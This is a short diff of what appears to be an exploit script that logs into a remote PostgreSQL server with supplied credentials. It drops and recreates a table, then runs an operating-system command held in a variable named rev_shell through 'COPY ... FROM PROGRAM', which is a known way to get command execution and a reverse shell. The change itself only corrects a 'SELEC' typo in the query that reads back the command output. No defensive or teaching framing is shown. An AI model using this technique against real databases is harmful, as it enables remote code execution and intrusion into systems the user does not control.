@@ -18,7 +18,7 @@ with psycopg2.connect(host=RHOST, port=RPORT, user=USER, password=PASSWD) as con
         cur.execute('DROP TABLE IF EXISTS cmd_exec')
         cur.execute('CREATE TABLE cmd_exec(cmd_output text)')
         cur.execute('COPY cmd_exec FROM PROGRAM \'' + rev_shell  + '\'')
-        cur.execute('SELEC * from cmd_exec')
+        cur.execute('SELECT * from cmd_exec')
         v = cur.fetchone()
         #print(v)
         cur.close()
